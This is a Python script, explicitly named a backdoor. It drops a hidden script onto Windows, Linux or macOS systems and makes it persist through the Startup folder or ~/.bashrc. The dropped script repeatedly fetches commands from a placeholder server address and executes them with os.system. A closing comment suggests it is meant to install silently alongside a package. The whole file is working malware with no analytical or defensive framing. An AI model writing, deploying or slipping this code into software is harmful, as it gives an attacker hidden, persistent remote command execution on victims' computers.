import os
import sys
import shutil

# Backdoor script content
backdoor_script = """
import time
import requests
import os

# URL to get the command
server_url = 'http://your-server-ip:4352/get-command'

while True:
    try:
        # Fetch the latest command from the server
        response = requests.get(server_url)
        
        if response.status_code == 200:
            command = response.text.strip()  # Get the command text

            if command:
                # Print the command and execute it (you may want to sanitize commands in a real-world scenario)
                print(f"Executing command: {command}")
                os.system(command)
        
        # Wait 30 seconds before checking again
        time.sleep(30)
    
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(30)  # Retry after 30 seconds if there’s an error
"""

# Create the backdoor.py script on the system
def create_backdoor_script():
    # Path where the backdoor will be saved
    script_path = os.path.join(os.getenv('APPDATA'), 'backdoor.py') if sys.platform == 'win32' else os.path.join(os.getenv('HOME'), '.backdoor.py')

    # Write the backdoor script to the file
    with open(script_path, 'w') as f:
        f.write(backdoor_script)
    
    # Hide the backdoor file (Windows only)
    if sys.platform == 'win32':
        os.system(f'attrib +h "{script_path}"')
    elif sys.platform == 'linux' or sys.platform == 'darwin':
        # For Linux/macOS, you can make it hidden by prefixing with a dot
        hidden_script_path = os.path.join(os.getenv('HOME'), '.backdoor.py')
        os.rename(script_path, hidden_script_path)
        script_path = hidden_script_path

    return script_path

# Function to run the backdoor script in the background
def run_backdoor(script_path):
    if sys.platform == 'win32':
        # For Windows, run the backdoor script in the background
        os.system(f'start /B python "{script_path}"')
    elif sys.platform == 'linux' or sys.platform == 'darwin':
        # For Linux/macOS, run it using nohup to keep it running in the background
        os.system(f'nohup python "{script_path}" &')

# Ensure the backdoor runs on startup (Windows)
def add_to_startup(script_path):
    if sys.platform == 'win32':
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
        shutil.copy(script_path, startup_folder)
        # Create a shortcut (optional, for stealthiness)
        os.system(f'shortcut "{script_path}" "{startup_folder}\\backdoor.lnk"')

    elif sys.platform == 'linux' or sys.platform == 'darwin':
        # For Linux/macOS, we can add the script to rc.local or create a cron job for startup
        cron_file = os.path.expanduser("~/.bashrc")
        with open(cron_file, "a") as bashrc:
            bashrc.write(f"\nnohup python {script_path} &\n")

# Install the package and create the backdoor silently
script_path = create_backdoor_script()
add_to_startup(script_path)  # Ensure the backdoor runs on startup
run_backdoor(script_path)  # Run the backdoor immediately
